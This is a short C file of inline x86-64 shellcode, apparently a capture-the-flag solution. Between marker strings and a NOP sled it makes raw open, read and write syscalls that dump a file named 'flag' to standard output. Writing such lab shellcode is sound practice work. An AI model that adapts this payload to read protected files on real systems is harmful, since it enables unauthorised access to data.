#include <stdio.h>

int main() {
    __asm__ __volatile__(
        ".ascii \"V1me\";\n"
        ".intel_syntax noprefix;\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        
        // open("flag", 0)
        "mov rax, 2;\n"
        "lea rdi, [rip + flag];\n"
        "mov rsi, 0;\n"
        "mov rdx, 0;\n"
        "syscall;\n"

        // read(fd, buf, 0x100)
        "mov rdi, rax;\n"
        "mov rsi, rsp;\n"
        "add rsi, 0x8;\n"
        "push rsi;\n"
        "mov rdx, 0x100;\n"
        "mov rax, 0;\n"
        "syscall;\n"

        // write(1, buf, 0x100)
        "mov rdi, 1;\n"
        "pop rsi;\n"
        "mov rdx, 0x100;\n"
        "mov rax, 1;\n"
        "syscall;\n"

        "ret;\n"

        ".byte 0xff, 0xff, 0xff, 0xff;\n"

        "flag:\n"
        ".ascii \"flag\";\n"
        ".byte 0x0;\n"

        ".att_syntax prefix\n"
        ".ascii \"V7me\";\n"
        :
        :
        :
    );
}